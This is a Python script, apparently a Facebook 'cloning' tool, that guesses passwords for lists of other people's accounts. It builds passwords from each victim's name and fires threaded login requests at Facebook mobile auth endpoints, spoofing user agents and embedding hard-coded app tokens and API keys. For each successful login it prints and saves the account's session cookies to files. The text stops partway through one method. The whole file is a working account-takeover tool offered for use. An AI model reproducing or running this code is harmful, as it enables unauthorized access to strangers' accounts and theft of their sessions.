#──────────────{ IMPORT }──────────────#
import os,bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,requests,httpx,re,pycurl,io
from bs4 import BeautifulSoup
from os import path
import os,base64,zlib,pip,urllib
import requests,bs4,mechanize
from os import system as clr
from bs4 import BeautifulSoup as sop
from pip._vendor import requests as requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

import random
import string



model2 ="""M2101K6G
Aquaris U Plus
SM-G780G
SM-O497J
SM-L427V
SM-C297Z
SM-G507X
SM-Y634L
SM-J204F
SM-R911A
SM-X801O
SM-A792E
SM-H270F
SM-P993J
SM-V233F
SM-O861W
SM-D182C
SM-Y729G
SM-Z367Q
SM-U191O
SM-U559U
SM-B567Y
SM-O846M
SM-G342Z
SM-K531M
SM-I847H
SM-A728M
SM-L637H
SM-L429N
SM-P413J
SM-N731T
SM-R505B
SM-A744X
SM-O400L
SM-F799H
SM-Z679E
SM-G822H
SM-N489K
SM-Z200Z
SM-Y119O
SM-E201F
SM-N785T
SM-G200V
SM-R067J
SM-N134B
SM-N227J
SM-K221P
SM-S150D
SM-A869J
SM-H143V
SM-C469H
SM-T152I
SM-Y575D
SM-W880B
SM-W460Q
SM-Q159J
SM-U637R
SM-J924Q
SM-W512P
SM-I745B
SM-O118H
SM-U111M
SM-U522B
SM-B611V
SM-G520J
SM-D144B
SM-C181B
SM-V128Q
SM-U167W
SM-L098E
SM-P454L
SM-L943O
SM-D368H
SM-P485X
SM-C715N
SM-H010U
SM-H710B
SM-X633F
SM-Z040T
SM-Q391G
SM-N451P
SM-T115B
SM-R248C
SM-T618P
SM-S067L
SM-M619P
SM-Q048A
SM-I787D
SM-X275W
SM-G911F
SM-R924W
SM-S506Z
SM-V941V
SM-G016M
SM-O008J
SM-L296E
SM-U876V
SM-L600X
SM-G169P
SM-F578L
SM-S727V
SM-F213B
SM-U822H
SM-Q995Y
SM-I602I
SM-V225C
SM-U921J
SM-Z302E
SM-Y080Z
SM-X174G
SM-T157W
SM-M311W
SM-H791P
SM-Q343U
SM-H261C
SM-D442E
SM-E047H
SM-S082M
SM-U311K
SM-Z651V
SM-I566H
SM-I593C
SM-L375P
SM-D399D
SM-Y086S
SM-O365U
SM-W782A
SM-S236Q
SM-D514J
SM-W806F
SM-W809F
SM-M645P
SM-W098A
SM-O026U
SM-Y689Z
SM-D832N
SM-C691X
SM-D921H
SM-G403Y
SM-S210U
SM-D768K
SM-F912H
SM-H856A
SM-J184W
SM-D512U
SM-K786Z
SM-Z107O
SM-D499G
SM-C815N
SM-D590H
SM-V695N
SM-M093A
SM-S354P
SM-F657J
SM-R743O
SM-A180A
SM-B651H
SM-X279B
SM-X429B
SM-R588G
SM-Y318K
SM-G967W
SM-P668C
SM-B401K
SM-S853U
SM-A377K
SM-K914A
SM-J624R
SM-L536Y
SM-B190B
SM-Q769S
SM-Z872L
SM-S322A
SM-O621Y
SM-N100L
SM-A840S
SM-E543H
SM-H386M
SM-Y932W
SM-T496G
SM-E768E
SM-R031A
SM-Q015D
SM-P522K
SM-D436Z
SM-R077U
SM-I233Z
SM-H906Q
SM-K838M
SM-O369U
SM-F458K
SM-M382E
SM-L337L
SM-G904B
SM-N351H
SM-V670M
SM-W266H
SM-Q576G
SM-G359C
SM-R096P
SM-F952H
SM-Y608N
SM-C736V""".splitlines()

os.system('espeak -b 1000 "welcome axn command"')
#──────────────{ LOOP }──────────────#
loop = 0;oks = [];cps = [];id = []
#──────────────{ COLOUR }──────────────#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m'
#──────────────{ LINEX }──────────────#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}─────────────────────────────────────────────────')
#──────────────{ NORMAL-UA-FOR-M8 }──────────────#
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)
for xd in range(5000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    #ua
    
def randBuildLSB():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    END = '[FBAN/MobileAdsManagerAndroid;FB_IAB/FB4A;FBAV/425.0.0.22.49;FBBV/873387085;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fr_FR;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/MobileAdsManagerAndroid;FBAV/408.0.0.56.44;FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/12;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/410.0.0.26.115;FBBV/645124693;FBRV/0;FBPN/com.facebook.katana;FBLC/th_TH;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/10;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FBAN/FB4A;FBAV/278.0.0.25.54;FBBV/272257514;FBRV/0;FBPN/com.facebook.katana;FBLC/el_GR;FBMF/Blu;FBBD/Blu;FB_IAB/FB4A;FBAV/406.0.0.26.90;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"+"[FB_IAB/FB4A;FBAV/394.0.0.40.107;FB_IAB/FB4A;FBAV/388.0.0.32.105;FBRV/0;FBPN/com.facebook.katana;FBLC/id_ID;FBMF/Blu;FBBD/Blu;FBDV/C5L Max;FBSV/14;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]'
    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)}  Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
    return ua
#──────────────{ UA-FOR-RANDOM }──────────────#
def fuckx():
	model = random.choice(["SM-G780G","SM-O497J","SM-L427V","SM-C297Z","SM-G507X","SM-Y634L","SM-J204F","SM-R911A","SM-X801O","SM-A792E","SM-H270F","SM-P993J","SM-V233F","SM-O861W","SM-D182C","SM-Y729G","SM-Z367Q","SM-U191O","SM-U559U","SM-B567Y","SM-O846M","SM-G342Z","SM-K531M","SM-I847H","SM-A728M","SM-L637H","SM-L429N","SM-P413J","SM-N731T","SM-R505B","SM-A744X","SM-O400L","SM-F799H","SM-Z679E"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	return bal
#──────────────{ LOGO }──────────────#
logo = f"""
     \033[1;32m


	
Open Message In A New Window Or
Share Message With A Friend
	
Generate Image Of Output Text
	patorjk.com	
  ____       _     _   _     ____      _      __  __   
 / __"| uU  /"\  u| \ |"| U /"___|uU  /"\  uU|' \/ '|u 
<\___ \/  \/ _ \/<|  \| |>\| |  _ / \/ _ \/ \| |\/| |/ 
 u___) |  / ___ \U| |\  |u | |_| |  / ___ \  | |  | |  
 |____/>>/_/   \_\|_| \_|   \____| /_/   \_\ |_|  |_|  
  )(  (__)\\    >>||   \\,-._)(|_   \\    >><<,-,,-.   
 (__)    (__)  (__)_")  (_/(__)__) (__)  (__)(./  \.)  
\x1b[1;92m[\x1b[1;97mV 0.1.1\x1b[1;92m
\n{A}─────────────────────────────────────────────────
\n{A}|➤| OWNER   : SANGAM TOPUP BRAND
\n{A}|➤| TOOL    : FILE/RANDOM
\n{A}|➤| VERSION : 0.1.1
\n{A}|➤| Inbox aau aprove ko laghi [KEW Sangam XUDABI NA  ]
\n{A}|➤| Fully nepali command ho use gara
\n{A}─────────────────────────────────────────────────"""
#──────────────{ MENU }──────────────#
def asif():
	model = random.choice(["X6815C,", "Infinix X6511B","Infinix X678B","Infinix X605","Infinix X6710","Infinix X6711","Infinix X6716B","Infinix X6820","Infinix X677","Infinix X695","Infinix X6832","Infinix Zero 4 Plus"])
	bal = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/443010639;FBDM/"+"{density=2.4,width=1080,height=2280}"+f";FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/{model};FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
	return bal
#vuda

def menu():
	clear()
	print(f"{A}|1| FILE CLONING")
	print(f"{A}|2| RANDOM CLONING")
	print(f"{A}|3| GMAIL CLONING")
#	print(f"{A}|4| EXIT CLONING")
	linex()
	option = input(f'{A}|?| CHOICE : ')
	if option in ['A','1']:__Filex__()
	elif option in ['B','2']:__Randmx__()
	elif option in ['C','3']:__Gmailx__()
	elif option in ['D','4']:exit()
	else:
		print(f'\n{A}|=| OPTION FOUND');menu()
#──────────────{ FILE }──────────────#
def __Filex__():
    clear()
    print(f"{A}|=| EXAMPLE : /sdcard/Filename.txt ");linex();dfile = input(f'{A}|?| CHOICE  : ')
    try:
        dx = open(dfile,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{A}|=| FILE NOT FOUND...');time.sleep(1);__Filex__()
    clear()
    print(f"{A}|1| METHOD M1 ");print(f"{A}|2| METHOD M2 ");print(f"{A}|3| METHOD M3 ");print(f"{A}|4| METHOD M4 ");linex();methodx = input(f'{A}|?| CHOICE : ')
#	print(f"{A}|5| METHOD M5 ")
#	print(f"{A}|6| METHOD M6 ")
#	print(f"{A}|7| METHOD M7 ")
#	print(f"{A}|8| METHOD M8 ")
    dplist = []
    try:
        clear()
        pass_lmit = int(input(f'{A}|?| PASSWORD LIMIT : '))
    except:
        pass_lmit =1
    clear()
    print(f"{A}|=| EXAMPLE : firstlast | first123 |ETC| ");linex()
    for i in range(pass_lmit):
        dplist.append(input(f'{A}|=| PASSWORD NO.{i+1} :{G} '))
    with ThreadPool(max_workers=30) as Sangam:
        clear();total_ids = str(len(dx))
        print(f"{A}|=| FILE UID {G}|{A} PASSWORD :{G} {total_ids} {G}|{Y} {pass_lmit} ");print(f"{A}|=| USE AIRPLANE MODE EVERY 5 MINTS Brand ");linex()
        for user in dx:
            ids,names = user.split('|')
            passlist = dplist
            if methodx in ['1']:Sangam.submit(__file_M1__,ids,names,passlist)
            if methodx in ['2']:Sangam.submit(__file_M2__,ids,names,passlist)
            if methodx in ['3']:Sangam.submit(__file_M3__,ids,names,passlist)
            if methodx in ['4']:Sangam.submit(__file_M4__,ids,names,passlist)
            if methodx in ['5']:Sangam.submit(__file_M5__,ids,names,passlist)
            if methodx in ['6']:Sangam.submit(__file_M6__,ids,names,passlist)
            if methodx in ['7']:Sangam.submit(__file_M7__,ids,names,passlist)
            if methodx in ['8']:Sangam.submit(__file_M8__,ids,names,passlist)
    print('');print(f'\n{A}─────────────────────────────────────────────────');print(f"{A}|=| CLONING COMPLETE ");print(f"{A}|=| TOTAL OK ID :{G} {len(oks)}");print(f"{A}|=| TOTAL CP ID :{R} {len(cps)}");print(f'\n{A}─────────────────────────────────────────────────');exit()
#──────────────{ FILE-METHOD-M1 }──────────────#
def __file_M1__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M1| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASIF-M1-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/ASIF-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M2 }──────────────#
def __file_M2__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M2| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {'User-Agent': fuckx(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'b-graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)                
                open('/sdcard/ASIF-M2-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/ASIF-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M3 }──────────────#
def __file_M3__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|ASIF-M3| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": randBuildLSB(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://b-api.facebook.com/method/auth.login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SANGM3-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/SANG-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M4 }──────────────#
def __file_M4__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SANG-M4| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://graph.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/SANG-M4-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/ASIF-M4-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M5 }──────────────#
def __file_M5__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SANG-M5| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            head = {"User-Agent": fuckx(),"Accept-Encoding":"gzip, deflate","Connection":"keep-alive","Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(3e7,4e7)),"X-FB-SIM-HNI":str(random.randint(2e4,4e4)),"X-FB-Connection-Type":"MOBILE.LTE","Authorization":"OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895","X-FB-Connection-Quality":"MOBILE.LTE","X-FB-Connection-Bandwidth":str(random.randint(3e7,4e7)),"X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":"5120","X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
            data = {"adid":str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"register_api","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"NO_FILE","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login","fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
            po = requests.post('https://api.facebook.com/auth/login',data=data,headers=head).json()
            if "session_key" in po:
                token = po['access_token']
                session = po['session_cookies'];cookie = '';cuser = session[0];cuser = session[0]['name']+'='+session[0]['value'];cookie+=cuser+';';xs = session[1]['name']+'='+session[1]['value'];cookie+=xs+';';fr = session[2]['name']+'='+session[2]['value'];cookie+=fr+';';datr = session[3]['name']+'='+session[3]['value'];cookie+=datr+';dpr=2;locale=en_US;wd=950x1835;';pagevoice = cuser.replace('c_user','m_page_voice');cookie+=pagevoice
                print(f'\r\r\x1b[38;5;46m|A x N_OK| '+ids+' | '+pas)
                print(f'\r\r\x1b[38;5;46m|COKI-OK| {cookie}\n')
                open('/sdcard/ASIF-M5-OK-COKI.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{R}|A x N_CP| '+ids+f' | '+pas)
                open('/sdcard/SANG-M5-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        pass
#──────────────{ FILE-METHOD-M6 }──────────────#
def __file_M6__(ids,names,passlist):
    try:
        global loop,oks,cps
        sys.stdout.write(f'\r\r{A}|SANG-M6| %s {G}|{A} OK{G}|{A}CP %s{G}|{A}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
